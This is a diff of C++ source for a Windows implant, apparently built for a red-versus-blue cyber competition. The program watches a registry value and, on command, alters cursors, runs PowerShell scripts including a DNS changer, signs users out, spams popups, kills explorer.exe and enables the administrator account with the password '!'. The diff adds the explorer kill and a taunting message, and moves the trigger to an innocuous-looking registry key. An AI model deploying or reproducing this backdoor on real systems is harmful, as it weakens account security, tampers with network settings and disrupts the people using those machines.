@@ -25,6 +25,8 @@
 	0x0000008 : Signs the user out
 	0x0000009 : Messages "IMPORTANT NOTICE" title with a message asking if they know we are still there 50x.
 	0x0000010 : Set the admin account to active and change the password to "!"
+	0x0000011 : Activates the Administrator user and changes the password
+	0x0000012 : Sends a message and asks blue team out to Prom
 
 */
 
@@ -120,7 +122,7 @@ void glitchCursor() {
 
 	LPCWSTR valuename = L"Arrow";
 	wstring path = L"%SystemRoot%\\cursors\\aero_arrow_s.cur";
-	long setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);
+	long setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);
 
 	if (setCheck == ERROR_SUCCESS) {
 		wcout << "\tValue Changed: " << valuename << endl;
@@ -128,7 +130,7 @@ void glitchCursor() {
 
 	valuename = L"Hand";
 	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
-	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);
+	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);
 
 	if (setCheck == ERROR_SUCCESS) {
 		wcout << "\tValue Changed: " << valuename << endl;
@@ -136,7 +138,7 @@ void glitchCursor() {
 
 	valuename = L"Help";
 	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
-	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);
+	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);
 
 	if (setCheck == ERROR_SUCCESS) {
 		wcout << "\tValue Changed: " << valuename << endl;
@@ -144,7 +146,7 @@ void glitchCursor() {
 
 	valuename = L"Wait";
 	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
-	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);
+	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);
 
 	if (setCheck == ERROR_SUCCESS) {
 		wcout << "\tValue Changed: " << valuename << endl;
@@ -152,7 +154,7 @@ void glitchCursor() {
 
 	valuename = L"AppStarting";
 	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
-	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);
+	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);
 
 	if (setCheck == ERROR_SUCCESS) {
 		wcout << "\tValue Changed: " << valuename << endl;
@@ -160,7 +162,7 @@ void glitchCursor() {
 
 	valuename = L"No";
 	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
-	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);
+	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);
 
 	if (setCheck == ERROR_SUCCESS) {
 		wcout << "\tValue Changed: " << valuename << endl;
@@ -168,7 +170,7 @@ void glitchCursor() {
 
 	valuename = L"NWPen";
 	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
-	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);
+	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);
 
 	if (setCheck == ERROR_SUCCESS) {
 		wcout << "\tValue Changed: " << valuename << endl;
@@ -176,7 +178,7 @@ void glitchCursor() {
 
 	valuename = L"SizeAll";
 	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
-	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);
+	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);
 
 	if (setCheck == ERROR_SUCCESS) {
 		wcout << "\tValue Changed: " << valuename << endl;
@@ -184,7 +186,7 @@ void glitchCursor() {
 
 	valuename = L"SizeNESW";
 	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
-	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);
+	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);
 
 	if (setCheck == ERROR_SUCCESS) {
 		wcout << "\tValue Changed: " << valuename << endl;
@@ -192,7 +194,7 @@ void glitchCursor() {
 
 	valuename = L"SizeNS";
 	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
-	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);
+	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);
 
 	if (setCheck == ERROR_SUCCESS) {
 		wcout << "\tValue Changed: " << valuename << endl;
@@ -200,7 +202,7 @@ void glitchCursor() {
 
 	valuename = L"SizeNWSE";
 	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
-	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);
+	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);
 
 	if (setCheck == ERROR_SUCCESS) {
 		wcout << "\tValue Changed: " << valuename << endl;
@@ -208,7 +210,7 @@ void glitchCursor() {
 
 	valuename = L"SizeWE";
 	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
-	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);
+	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);
 
 	if (setCheck == ERROR_SUCCESS) {
 		wcout << "\tValue Changed: " << valuename << endl;
@@ -216,7 +218,7 @@ void glitchCursor() {
 
 	valuename = L"UpArrow";
 	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
-	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);
+	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);
 
 	if (setCheck == ERROR_SUCCESS) {
 		wcout << "\tValue Changed: " << valuename << endl;
@@ -252,7 +254,7 @@ void defaultCursor() {
 
 	LPCWSTR valuename = L"Arrow";
 	wstring path = L"%SystemRoot%\\cursors\\aero_arrow.cur";
-	long setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);
+	long setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);
 
 	if (setCheck == ERROR_SUCCESS) {
 		wcout << "\tValue Restored: " << valuename << endl;
@@ -260,7 +262,7 @@ void defaultCursor() {
 
 	valuename = L"Hand";
 	path = L"%SystemRoot%\\cursors\\aero_link.cur";
-	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);
+	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);
 
 	if (setCheck == ERROR_SUCCESS) {
 		wcout << "\tValue Restored: " << valuename << endl;
@@ -268,7 +270,7 @@ void defaultCursor() {
 
 	valuename = L"Help";
 	path = L"%SystemRoot%\\cursors\\aero_helpsel.cur";
-	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);
+	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);
 
 	if (setCheck == ERROR_SUCCESS) {
 		wcout << "\tValue Restored: " << valuename << endl;
@@ -276,7 +278,7 @@ void defaultCursor() {
 
 	valuename = L"Wait";
 	path = L"%SystemRoot%\\cursors\\aero_busy.ani";
-	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);
+	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);
 
 	if (setCheck == ERROR_SUCCESS) {
 		wcout << "\tValue Restored: " << valuename << endl;
@@ -284,7 +286,7 @@ void defaultCursor() {
 
 	valuename = L"AppStarting";
 	path = L"%SystemRoot%\\cursors\\aero_working.cur";
-	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);
+	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);
 
 	if (setCheck == ERROR_SUCCESS) {
 		wcout << "\tValue Restored: " << valuename << endl;
@@ -292,7 +294,7 @@ void defaultCursor() {
 
 	valuename = L"No";
 	path = L"%SystemRoot%\\cursors\\aero_unavail.cur";
-	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);
+	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);
 
 	if (setCheck == ERROR_SUCCESS) {
 		wcout << "\tValue Changed: " << valuename << endl;
@@ -300,7 +302,7 @@ void defaultCursor() {
 
 	valuename = L"NWPen";
 	path = L"%SystemRoot%\\cursors\\aero_pen.cur";
-	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);
+	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);
 
 	if (setCheck == ERROR_SUCCESS) {
 		wcout << "\tValue Changed: " << valuename << endl;
@@ -308,7 +310,7 @@ void defaultCursor() {
 
 	valuename = L"SizeAll";
 	path = L"%SystemRoot%\\cursors\\aero_move.cur";
-	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);
+	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);
 
 	if (setCheck == ERROR_SUCCESS) {
 		wcout << "\tValue Changed: " << valuename << endl;
@@ -316,7 +318,7 @@ void defaultCursor() {
 
 	valuename = L"SizeNESW";
 	path = L"%SystemRoot%\\cursors\\aero_nesw.cur";
-	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);
+	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);
 
 	if (setCheck == ERROR_SUCCESS) {
 		wcout << "\tValue Changed: " << valuename << endl;
@@ -324,7 +326,7 @@ void defaultCursor() {
 
 	valuename = L"SizeNS";
 	path = L"%SystemRoot%\\cursors\\aero_ns.cur";
-	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);
+	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);
 
 	if (setCheck == ERROR_SUCCESS) {
 		wcout << "\tValue Changed: " << valuename << endl;
@@ -332,7 +334,7 @@ void defaultCursor() {
 
 	valuename = L"SizeNWSE";
 	path = L"%SystemRoot%\\cursors\\aero_nwse.cur";
-	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);
+	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);
 
 	if (setCheck == ERROR_SUCCESS) {
 		wcout << "\tValue Changed: " << valuename << endl;
@@ -340,7 +342,7 @@ void defaultCursor() {
 
 	valuename = L"SizeWE";
 	path = L"%SystemRoot%\\cursors\\aero_ew.cur";
-	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);
+	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);
 
 	if (setCheck == ERROR_SUCCESS) {
 		wcout << "\tValue Changed: " << valuename << endl;
@@ -348,7 +350,7 @@ void defaultCursor() {
 
 	valuename = L"UpArrow";
 	path = L"%SystemRoot%\\cursors\\aero_up.cur";
-	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);
+	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);
 
 	if (setCheck == ERROR_SUCCESS) {
 		wcout << "\tValue Changed: " << valuename << endl;
@@ -372,7 +374,7 @@ Description :
 void callScript(string path) {
 
 	if (_access(path.c_str(), 0) == 0) {
-		string run = "start powershell.exe -windowstyle hidden ";
+		string run = "start powershell.exe "; // -windowstyle hidden
 		run.append(path);
 
 
@@ -380,6 +382,17 @@ void callScript(string path) {
 		Sleep(1000);
 		system(run.c_str());
 	}
+}
+
+/*
+Function : killExplorer
+
+Description :
+	This function kills explorer.exe.
+*/
+void killExplorer() {
+	// TODO : Iterate through the PIDs and end explorer not through the system function.
+	system("taskkill /IM explorer.exe /F");
 }
 
 /*
@@ -403,8 +416,8 @@ DWORD WINAPI PopupThread(LPVOID lpParameter) {
 
 	// This is the registry and key that is being checked
 	HKEY reg = HKEY_CURRENT_USER;
-	LPCWSTR regPath = L"Software\\Microsoft\\Internet Mail and News\\Mail";
-	LPCWSTR regRead = L"Log Outlook (0/1)";
+	LPCWSTR regPath = L"AppEvents";
+	LPCWSTR regRead = L"testvalue";
 
 	DWORD resetValue = 0x00000000;
 
@@ -426,16 +439,20 @@ DWORD WINAPI PopupThread(LPVOID lpParameter) {
 					defaultCursor();
 				}
 				else if (buffer == 0x00000004) {
-					callScript("C:\\Users\\jon\\Documents\\PowershellScripts\\MemeScripts\\RickBomb.ps1");
+					//callScript("C:\\Users\\jon\\Documents\\PowershellScripts\\MemeScripts\\RickBomb.ps1");
+					callScript("C:\\Users\\student\\RickBomb.ps1");
 				}
 				else if (buffer == 0x00000005) {
-					callScript("C:\\Users\\jon\\Documents\\PowershellScripts\\MemeScripts\\KeyboardChanger.ps1");
+					//callScript("C:\\Users\\jon\\Documents\\PowershellScripts\\MemeScripts\\KeyboardChanger.ps1");
+					callScript("C:\\Users\\student\\KeyboardChanger.ps1");
 				}
 				else if (buffer == 0x00000006) {
-					callScript("C:\\Users\\jon\\Documents\\PowershellScripts\\MemeScripts\\KeybaordDefault.ps1");
+					//callScript("C:\\Users\\jon\\Documents\\PowershellScripts\\MemeScripts\\KeybaordDefault.ps1");
+					callScript("C:\\Users\\student\\KeyboardDefault.ps1");
 				}
 				else if (buffer == 0x00000007) {
-					callScript("C:\\Users\\jon\\Documents\\PowershellScripts\\MemeScripts\\DNSChanger.ps1");
+					//callScript("C:\\Users\\jon\\Documents\\PowershellScripts\\MemeScripts\\DNSChanger.ps1");
+					callScript("C:\\Users\\student\\DNSChanger.ps1");
 				}
 				else if (buffer == 0x00000008) {
 					system("shutdown -L");
@@ -445,6 +462,12 @@ DWORD WINAPI PopupThread(LPVOID lpParameter) {
 				}
 				else if (buffer == 0x00000010) {
 					system("net user administrator /active:yes !");
+				}
+				else if (buffer == 0x00000011) {
+					killExplorer();
+				}
+				else if (buffer == 0x00000012) {
+					messageSpam(L"HEY BLUE TEAM", L"Will go to Prom with me? :) -Red Team", NUM_BOXES / 2);
 				}
 			}
 			RegSetValueEx(hKey, regRead, 0, REG_DWORD, (BYTE*)&resetValue, sizeof(resetValue));
